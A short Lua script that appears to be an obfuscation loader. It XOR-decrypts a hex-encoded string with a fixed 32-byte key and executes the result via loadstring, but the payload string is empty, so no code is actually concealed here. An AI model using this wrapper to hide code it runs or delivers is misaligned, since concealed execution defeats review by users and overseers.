local k={134,152,252,155,67,150,101,33,48,111,73,126,222,64,8,54,78,26,39,110,131,240,213,19,194,219,82,107,68,48,197,4}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
